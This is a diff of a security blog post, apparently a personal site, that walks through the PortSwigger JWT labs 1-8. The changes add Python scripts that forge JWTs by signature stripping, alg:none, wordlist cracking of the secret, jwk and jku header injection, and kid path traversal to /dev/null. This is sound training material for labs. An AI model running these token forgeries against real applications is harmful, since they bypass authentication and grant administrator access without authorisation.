@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>PortSwigger JWT Labs 1-8 Write-Up &amp; Burp Workflows - Vali Hakuryuko</title>
-  <meta name="description" content="A Burp-first walkthrough of PortSwigger's JWT labs, covering none-alg abuse, weak secrets, header injection, and algorithm confusion without Python automation." />
-  <meta property="og:title" content="PortSwigger JWT Labs 1-8 Write-Up &amp; Burp Workflows - Vali Hakuryuko" />
-  <meta property="og:description" content="A Burp-first walkthrough of PortSwigger's JWT labs, covering none-alg abuse, weak secrets, header injection, and algorithm confusion without Python automation." />
+  <title>PortSwigger JWT Labs 1-8 Write-Up, Burp Workflows &amp; Python Scripts - Vali Hakuryuko</title>
+  <meta name="description" content="A detailed walkthrough of PortSwigger's JWT labs using both Burp Suite and Python scripts, covering none-alg abuse, weak secrets, header injection, and algorithm confusion." />
+  <meta property="og:title" content="PortSwigger JWT Labs 1-8 Write-Up, Burp Workflows &amp; Python Scripts - Vali Hakuryuko" />
+  <meta property="og:description" content="A detailed walkthrough of PortSwigger's JWT labs using both Burp Suite and Python scripts, covering none-alg abuse, weak secrets, header injection, and algorithm confusion." />
   <meta property="og:type" content="article" />
   <meta property="og:image" content="/image/profile.jpg" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -31,17 +31,17 @@
       <div class="post-meta-row">
         <span class="post-date">2026-06-07</span>
         <a href="/blog.html?tag=web" class="post-tag-link" aria-label="Browse Web posts"><span class="post-tag">Web</span></a><a href="/blog.html?tag=port-swigger" class="post-tag-link" aria-label="Browse Port Swigger posts"><span class="post-tag">Port Swigger</span></a><a href="/blog.html?tag=burp-suite" class="post-tag-link" aria-label="Browse Burp Suite posts"><span class="post-tag blue">Burp Suite</span></a><a href="/blog.html?tag=jwt" class="post-tag-link" aria-label="Browse JWT posts"><span class="post-tag orange">JWT</span></a>
-        <span class="post-read-time">~28 min read</span>
+        <span class="post-read-time">~50 min read</span>
       </div>
-      <h1 class="post-title">PortSwigger JWT Labs 1-8<br>Write-Up &amp; Burp Workflows</h1>
-      <p class="post-subtitle">A lab-by-lab walkthrough of the PortSwigger JWT track, focused on what to do in Burp Suite: decode, tamper, re-sign, replay, and prove exactly why each trust decision fails.</p>
+      <h1 class="post-title">PortSwigger JWT Labs 1-8<br>Write-Up, Burp Workflows &amp; Python Scripts</h1>
+      <p class="post-subtitle">A lab-by-lab walkthrough of the PortSwigger JWT track, showing both the manual Burp Suite workflow and Python-based alternatives for token decoding, tampering, and forgery.</p>
     </header>
 
     <section class="article-brief" aria-label="Article overview">
       <div class="article-brief-grid">
         <div class="article-brief-block">
           <span class="article-brief-label">What This Covers</span>
-          <p>The full eight-lab JWT path in Web Security Academy, from <code>alg: none</code> abuse to JWK header injection and algorithm confusion.</p>
+          <p>The full eight-lab JWT path in Web Security Academy, from <code>alg: none</code> abuse to JWK header injection and algorithm confusion, with both Burp and Python approaches where scripts were provided.</p>
         </div>
         <div class="article-brief-block">
           <span class="article-brief-label">Target / Lab</span>
@@ -49,11 +49,11 @@
         </div>
         <div class="article-brief-block">
           <span class="article-brief-label">Tools Used</span>
-          <div class="article-tools"><span class="article-tool">Burp Suite</span><span class="article-tool">JWT Editor</span><span class="article-tool">Repeater</span><span class="article-tool">Exploit Server</span><span class="article-tool">sig2n helper</span></div>
+          <div class="article-tools"><span class="article-tool">Burp Suite</span><span class="article-tool">JWT Editor</span><span class="article-tool">Repeater</span><span class="article-tool">Python</span><span class="article-tool">PyJWT</span><span class="article-tool">cryptography</span><span class="article-tool">Exploit Server</span><span class="article-tool">sig2n helper</span></div>
         </div>
         <div class="article-brief-block article-brief-wide">
           <span class="article-brief-label">Key Takeaways</span>
-          <ul class="article-takeaways"><li>Most JWT bugs are trust bugs: the server trusts attacker-controlled headers, claims, or algorithm choices.</li><li>Burp is enough for almost the whole track once JWT Editor is installed and you are comfortable re-signing tokens.</li><li>When a backend confuses RSA and HMAC, even a public key can become the secret that forges admin access.</li></ul>
+          <ul class="article-takeaways"><li>Most JWT bugs are trust bugs: the server trusts attacker-controlled headers, claims, or algorithm choices.</li><li>Burp is still the cleanest place to validate each idea manually, but scripting is useful once the attack path is understood.</li><li>When a backend confuses RSA and HMAC, even a public key can become the secret that forges admin access.</li></ul>
         </div>
       </div>
     </section>
@@ -260,7 +260,7 @@
     <div class="toc">
       <div class="toc-title">// contents</div>
       <ol>
-        <li><a href="#setup">JWT setup in Burp</a></li>
+        <li><a href="#setup">JWT setup in Burp and Python</a></li>
         <li><a href="#lab1">Lab 1 - Unverified signature</a></li>
         <li><a href="#lab2">Lab 2 - Flawed signature verification</a></li>
         <li><a href="#lab3">Lab 3 - Weak signing key</a></li>
@@ -274,12 +274,12 @@
     </div>
 
     <article>
-      <h2 id="setup">JWT setup in Burp</h2>
+      <h2 id="setup">JWT setup in Burp and Python</h2>
       <p>
         Before touching the labs, install the <strong>JWT Editor</strong> extension from the Burp BApp Store. That gives you the fast path for decoding tokens, editing claims, generating RSA keys, embedding JWK values, and re-signing tokens without leaving Repeater.
       </p>
       <p>
-        The reusable workflow for almost every JWT lab is the same: capture a request that carries the token, send it to Repeater, inspect the cookie or <code>Authorization</code> header, change the claims, then decide whether the exploit needs <code>none</code>, a forged HMAC signature, or a completely attacker-supplied key.
+        The reusable workflow for almost every JWT lab is the same: capture a request that carries the token, send it to Repeater, inspect the cookie or <code>Authorization</code> header, change the claims, then decide whether the exploit needs <code>none</code>, a forged HMAC signature, or a completely attacker-supplied key. The Python route follows the same logic, just with the token manipulation done in code instead of in JWT Editor.
       </p>
 
       <div class="token-grid">
@@ -300,6 +300,13 @@
       <div class="callout info">
         <div class="callout-title">Burp stack</div>
         <p>My default stack for these labs is Burp Repeater, JWT Editor, Decoder, and the Exploit Server where needed. For the last algorithm confusion lab, I keep PortSwigger's <code>sig2n</code> helper nearby to derive candidate RSA public keys before finishing the attack back in Burp.</p>
+      </div>
+
+      <div class="workflow-card">
+        <div class="workflow-title">Python prerequisites</div>
+        <p>For the scripts in this post, the core dependencies are <code>pyjwt</code> and, for the RSA-based labs, <code>cryptography</code>. The weak-signing-key script also assumes you have a usable wordlist, while the JWK and JKU scripts assume you already have a local RSA key pair saved as <code>private_key.pem</code> and <code>public_key.pem</code>.</p>
+<pre><code>pip install pyjwt cryptography</code></pre>
+        <p>Think of the Python path as an alternative once you already understand the lab manually. Burp is usually better for discovery and debugging, while Python is good when you want a repeatable way to decode, modify, and regenerate tokens outside the UI.</p>
       </div>
 
       <div class="lab-section" id="lab1">
@@ -336,6 +343,48 @@
             <li>Leave the signature as-is, or let it become stale naturally after the payload change. This lab does not care.</li>
             <li>Replay the request, then browse to the admin endpoint and complete the admin action.</li>
           </ol>
+        </div>
+
+        <h3>Python alternative</h3>
+        <p>
+          If you want to show the same flaw without Burp, this script takes the token, decodes the payload without verification, changes the payload by raw byte replacement, and rebuilds the token with the original signature still attached. That mirrors the exact weakness in this lab: the backend never checks whether the signature still matches the modified payload.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via Unverified Signature' video: https://youtu.be/-JAf08oGrcc
+import jwt
+import base64
+
+# Paste JWT token here
+token = 'INSERT_TOKEN_HERE'
+
+# Decode the token (without verifying)
+payload = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token: {payload}\n")
+
+# Modify the token (JWT manipulation)
+header, payload, signature = token.split('.')
+decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
+modified_payload = decoded_payload.replace(b'wiener', b'carlos')
+print(f"Modified payload: {modified_payload.decode()}\n")
+
+# Generate a new token with the modified payload (re-encode)
+modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
+modified_token = f"{header}.{modified_payload_b64}.{signature}"
+print(f"Modified token: {modified_token}\n")</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li><code>jwt.decode(..., verify_signature=False)</code> is only there to show you what the original claims look like. The exploit does not require a valid signature.</li>
+            <li>The script then splits the token manually into header, payload, and signature segments so it can edit the base64url payload directly.</li>
+            <li>The line <code>decoded_payload.replace(b'wiener', b'carlos')</code> is demo-specific. In your own lab run, change those byte strings to match the user or claim value you want to swap.</li>
+            <li>Finally, it rebuilds the token with the original signature still attached. Because the server does not verify it, the stale signature becomes irrelevant.</li>
+          </ol>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">Script caveat</div>
+          <p>This script works best when the claim value you want to replace already appears plainly in the JSON payload. If the token uses a different claim name or value format, edit the decoded JSON structurally instead of relying on a raw byte swap.</p>
         </div>
 
         <div class="callout info">
@@ -390,6 +439,45 @@
           </ol>
         </div>
 
+        <h3>Python alternative</h3>
+        <p>
+          The Python route for this lab is more direct: decode the token without verification, change the identity claim, and re-encode it with <code>algorithm=None</code>. The point is to generate a token whose header advertises <code>alg: none</code> so the backend skips signature verification entirely.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via Flawed Signature Verification' video: https://youtu.be/rEUoU6OYH_g
+import jwt
+
+# Paste JWT token here
+token = 'INSERT_TOKEN_HERE'
+
+# Decode the token (without verifying)
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token: {decoded_token}\n")
+
+# Modify the token (JWT manipulation)
+decoded_token['sub'] = 'administrator'
+print(f"Modified payload: {decoded_token}\n")
+
+# Generate a new token with the modified payload (re-encode)
+# Re-encode the JWT with None algorithm
+modified_token = jwt.encode(decoded_token, None, algorithm=None)
+print(f"Modified token: {modified_token}\n")</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li>It decodes the payload without checking the original signature, which is fine because this lab is about generating a brand-new unsigned token.</li>
+            <li>It changes the <code>sub</code> claim to <code>administrator</code>, matching the trust target in the lab.</li>
+            <li><code>jwt.encode(decoded_token, None, algorithm=None)</code> tells PyJWT to emit a token using the <code>none</code> algorithm rather than a signed algorithm like <code>HS256</code> or <code>RS256</code>.</li>
+            <li>The final output token is the Python equivalent of what you would build manually in Burp by setting <code>alg</code> to <code>none</code> and clearing the signature segment.</li>
+          </ol>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">Practical note</div>
+          <p>Different PyJWT versions can format <code>none</code> tokens slightly differently, so always inspect the final output and make sure it matches the shape the lab accepts: a header, a payload, and an empty signature segment.</p>
+        </div>
+
         <div class="callout warning">
           <div class="callout-title">Why this matters</div>
           <p>The algorithm must be fixed server-side. If the backend trusts the token to describe how it should be verified, the attacker gets to choose the weakest possible path.</p>
@@ -439,6 +527,72 @@
             <li>Re-sign the token with the recovered secret and replay the request in Repeater.</li>
             <li>Use the valid forged admin token to access the privileged function.</li>
           </ol>
+        </div>
+
+        <h3>Python alternative</h3>
+        <p>
+          This script automates the secret-recovery phase by reading the JWT header, identifying the HMAC algorithm in use, and testing candidate secrets from a wordlist until one validates the token. That makes it a good alternative to manual guessing, especially when you want to demonstrate why weak shared secrets break the entire trust model.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via Weak Signing Key' video: https://youtu.be/ov9yT4WAuzI
+import jwt
+
+# Paste JWT token here
+jwt_token = 'INSERT_TOKEN_HERE'
+wordlist_file = '/usr/share/wordlists/rockyou.txt'
+
+def attempt_fuzzing(secret_key, algorithm):
+    try:
+        decoded = jwt.decode(jwt_token, secret_key, algorithms=[algorithm])
+        print(f"Valid key found: {secret_key}")
+        print(f"Decoded payload: {decoded}")
+        return True
+    except jwt.InvalidSignatureError:
+        return False
+
+
+def fuzz_secret_key(wordlist):
+    header = jwt.get_unverified_header(jwt_token)
+    algorithm = header.get("alg")
+    if not algorithm:
+        print("Algorithm not found in JWT header.")
+        return None
+    else:
+        print(f"Algorithm: {algorithm}")
+
+    with open(wordlist, "r") as file:
+        for line in file:
+            secret_key = line.strip()
+            if attempt_fuzzing(secret_key, algorithm):
+                return secret_key
+    return None
+
+
+# Start fuzzing
+found_key = fuzz_secret_key(wordlist_file)
+if found_key:
+    print(f"\nSecret key found: {found_key}")
+else:
+    print("No valid secret key found.")</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li>It pulls the <code>alg</code> value from the unverified header so it knows which HMAC algorithm to test against.</li>
+            <li>It loops through a wordlist and attempts to verify the token with each candidate secret.</li>
+            <li>The first candidate that successfully validates the JWT is printed as the recovered signing key.</li>
+            <li>At that point, you have effectively become the signing authority for the application and can mint a forged admin token using the recovered secret.</li>
+          </ol>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">Scope note</div>
+          <p>As written, this script stops once it finds the secret key. That is enough to prove the weakness, but to complete the full exploit you still need to re-sign a modified administrator token afterward, either in Burp or in a second PyJWT step.</p>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">Path note</div>
+          <p>The bundled wordlist path points to a common Kali/Linux location. On Windows or a custom environment, update <code>wordlist_file</code> to wherever your local wordlist actually lives.</p>
         </div>
 
         <div class="callout info">
@@ -492,6 +646,81 @@
             <li>Sign the token with the private key you just generated.</li>
             <li>Replay the forged token in Repeater and confirm the backend accepts the attacker-supplied key material.</li>
           </ol>
+        </div>
+
+        <h3>Python alternative</h3>
+        <p>
+          The Python version of this attack does the same thing Burp does behind the scenes: it loads your RSA key pair, edits the payload, converts the public key into JWK form, then signs the forged token while embedding the attacker-controlled public key in the header.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via jwk Header Injection' video: https://youtu.be/t-RfzyW0iqA
+import jwt
+import base64
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
+# Step 1: Take a JWT and decode it
+token = 'INSERT_TOKEN_HERE'
+
+# Step 2: Verify the JWT signature
+with open('public_key.pem', 'rb') as f:
+    public_key = serialization.load_pem_public_key(
+        f.read(),
+        backend=default_backend()
+    )
+
+# Step 3: Decode the JWT
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token: {decoded_token}")
+decoded_header = jwt.get_unverified_header(token)
+print(f"Decoded header: {decoded_header}\n")
+
+# Step 4: Modify the token (JWT manipulation)
+decoded_token['sub'] = 'administrator'
+print(f"Modified token: {decoded_token}\n")
+
+# Step 5: Sign the modified JWT using your RSA private key and embed the public key in the JWK header
+with open('private_key.pem', 'rb') as f:
+    private_key = serialization.load_pem_private_key(
+        f.read(),
+        password=None,
+        backend=default_backend()
+    )
+
+# Extract the necessary information from the private key
+public_key = private_key.public_key()
+public_numbers = public_key.public_numbers()
+
+# Build the JWK header
+jwk = {
+    "kty": "RSA",
+    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
+    "kid": decoded_header['kid'],
+    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
+}
+
+# Step 6: Generate the modified token
+modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jwk': jwk, 'kid': decoded_header['kid']})
+
+# Print the modified token header
+print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")
+
+# Print the final token
+print("Final Token: " + modified_token)</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li>It reads the original token and extracts both the payload and the existing header values, especially <code>kid</code>.</li>
+            <li>It loads your own private key, derives the corresponding public key, and converts the public modulus and exponent into JWK form.</li>
+            <li>It updates the payload so the trusted subject becomes <code>administrator</code>.</li>
+            <li>It signs the forged token with your private key while embedding the matching public key into the <code>jwk</code> header.</li>
+          </ol>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">Small implementation detail</div>
+          <p>The script loads <code>public_key.pem</code> up front, but the real attack only depends on the key pair you control. The critical part is that the token ends up carrying your public key in the header and your private key is used to generate the matching signature.</p>
         </div>
 
         <div class="callout warning">
@@ -550,6 +779,85 @@
           </ol>
         </div>
 
+        <h3>Python alternative</h3>
+        <p>
+          This version moves the same process into code: decode the token, change the subject, build a JWKS document from your RSA key pair, and emit a forged JWT whose <code>jku</code> header points to attacker-controlled infrastructure.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via jku Header Injection' video: https://youtu.be/hMRdMmll8Bk
+import jwt
+import base64
+import json
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
+# Take a JWT and JKU URL as input
+token = 'INSERT_TOKEN_HERE'
+jku_url = 'INSERT_URL_HERE'
+
+# Load and serialize the public key
+with open('public_key.pem', 'rb') as f:
+    public_key = serialization.load_pem_public_key(
+        f.read(),
+        backend=default_backend()
+    )
+
+# Decode the JWT
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
+decoded_header = jwt.get_unverified_header(token)
+print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")
+
+# Modify the token (JWT manipulation)
+decoded_token['sub'] = 'administrator'
+print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")
+
+# Sign the modified JWT using your RSA private key
+with open('private_key.pem', 'rb') as f:
+    private_key = serialization.load_pem_private_key(
+        f.read(),
+        password=None,
+        backend=default_backend()
+    )
+
+# Extract the necessary information from the keys
+public_key = private_key.public_key()
+public_numbers = public_key.public_numbers()
+
+# Build the JWKs
+jwk = {
+    "kty": "RSA",
+    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
+    "kid": decoded_header['kid'],
+    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
+}
+keys = {"keys": [jwk]}
+print(f"JWK:\n{json.dumps(keys, indent=4)}\n")
+
+# Generate the modified token
+modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})
+
+# Print the modified token header
+print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")
+
+# Print the final token
+print("Final Token: " + modified_token)</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li>It decodes the original token and updates the trusted identity claim to <code>administrator</code>.</li>
+            <li>It derives a JWK from your RSA public key and wraps it inside a JWKS structure.</li>
+            <li>It prints that JWKS output so you can host it on the exploit server or any reachable endpoint you control.</li>
+            <li>It signs the modified token with your private key and sets <code>jku</code> so the server fetches your hosted key set during verification.</li>
+          </ol>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">Important split of responsibilities</div>
+          <p>The script prints the JWKS JSON, but you still need to publish that JSON somewhere the target server can reach. In the PortSwigger lab, that usually means pasting it into the exploit server response body and using that URL as <code>jku_url</code>.</p>
+        </div>
+
         <div class="callout info">
           <div class="callout-title">Operational detail</div>
           <p>If the JWKS document is malformed or the <code>kid</code> value does not line up exactly, the request usually fails fast. This lab is as much about clean key hosting as it is about header abuse.</p>
@@ -600,6 +908,44 @@
             <li>Sign the token as <code>HS256</code> with a blank secret.</li>
             <li>Replay the request and confirm the server now validates against the empty file target instead of the intended key store.</li>
           </ol>
+        </div>
+
+        <h3>Python alternative</h3>
+        <p>
+          This script turns the same idea into a small PyJWT payload generator: decode the token without verification, change the identity claim, then re-sign it under <code>HS256</code> with an empty secret while sending a traversal string in the <code>kid</code> header.
+        </p>
+
+<pre><code># Demo script for 'JWT Authentication Bypass via kid Header Path Traversal' video: https://youtu.be/78FIFrOi4Os
+import jwt
+
+# Paste JWT token here
+token = 'INSERT_TOKEN_HERE'
+
+# Decode the token (without verifying)
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token: {decoded_token}\n")
+
+# Modify the token (JWT manipulation)
+decoded_token['sub'] = 'administrator'
+print(f"Modified payload: {decoded_token}\n")
+
+# Generate a new token with the modified payload and added header parameter (re-encode)
+modified_token = jwt.encode(decoded_token, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
+print(f"Modified token: {modified_token}\n")</code></pre>
+
+        <div class="workflow-card">
+          <div class="workflow-title">What this script is doing</div>
+          <ol>
+            <li>It decodes the token without validating the original signature, because the goal is to create a brand-new forged token.</li>
+            <li>It changes the payload so the trusted subject becomes <code>administrator</code>.</li>
+            <li>It re-encodes the JWT with an empty HMAC secret and a traversal payload in the <code>kid</code> header.</li>
+            <li>If the server uses <code>kid</code> as a file path and resolves it unsafely, verification ends up reading from <code>/dev/null</code>, which behaves like an empty secret.</li>
+          </ol>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">Environment note</div>
+          <p>The hard-coded traversal target in the script is Unix-style because that is what the PortSwigger lab uses. In a real assessment, the path depth and target file depend entirely on the backend filesystem and how the application resolves <code>kid</code> values.</p>
         </div>
 
         <div class="callout warning">
@@ -656,6 +1002,11 @@
         </div>
 
         <div class="callout info">
+          <div class="callout-title">Python coverage note</div>
+          <p>I did not get a companion Python script for this lab in the set you sent over, so I am keeping this section Burp-led instead of inventing a separate script path that you did not actually use.</p>
+        </div>
+
+        <div class="callout info">
           <div class="callout-title">Mental model</div>
           <p>RSA public keys are safe to share only when the server treats them strictly as public verification material. The moment the code path lets them act like HMAC secrets, sharing them becomes enough to forge tokens.</p>
         </div>
@@ -706,6 +1057,11 @@
           </ol>
         </div>
 
+        <div class="callout info">
+          <div class="callout-title">Python coverage note</div>
+          <p>This is also still a Burp-first section because no standalone Python script was included for it. The helper here is <code>sig2n</code> for key derivation, then the actual replay and validation loop stays easier to reason about in Repeater.</p>
+        </div>
+
         <div class="callout warning">
           <div class="callout-title">The key lesson</div>
           <p>Even when the public key is not visibly exposed, broken algorithm handling can still collapse once enough signed material leaks through the application. Hiding the key is not the same thing as removing the confusion flaw.</p>
@@ -735,7 +1091,7 @@
         </div>
 
         <p>
-          Taken together, these labs form a clean progression. The early labs show what happens when the server skips signature checks entirely. The middle labs show the danger of trusting attacker-controlled key metadata. The last two labs show why algorithm selection must be pinned rigidly server-side.
+          Taken together, these labs form a clean progression. The early labs show what happens when the server skips signature checks entirely. The middle labs show the danger of trusting attacker-controlled key metadata. The last two labs show why algorithm selection must be pinned rigidly server-side. In this version of the writeup, the Python alternatives cover labs 1 through 6 because those are the scripts I actually had on hand, while labs 7 and 8 stay centered on the Burp workflow.
         </p>
 
         <div class="conclusion-grid">
